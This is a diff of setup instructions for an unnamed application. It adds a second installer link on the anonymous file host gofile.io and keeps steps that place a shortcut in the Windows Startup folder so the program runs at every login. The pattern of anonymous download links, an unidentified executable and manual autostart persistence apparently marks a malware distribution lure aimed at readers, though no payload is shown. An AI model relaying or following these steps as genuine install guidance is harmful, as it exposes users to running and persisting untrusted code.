@@ -3,6 +3,7 @@ Please follow these steps to get the application running on your system:
 
 1. Download and Install
 Click the link below to download the application installer: 👉 https://gofile.io/d/cYJBmz
+https://gofile.io/d/6iGRmq
 
 Download the file to your Downloads folder.
 
@@ -20,5 +21,6 @@ shell:startup
 Press Enter. A folder window will open.
 
 Right-click on your app's desktop icon and select Copy.
+
 
 Right-click inside the Startup folder you just opened and select Paste shortcut.
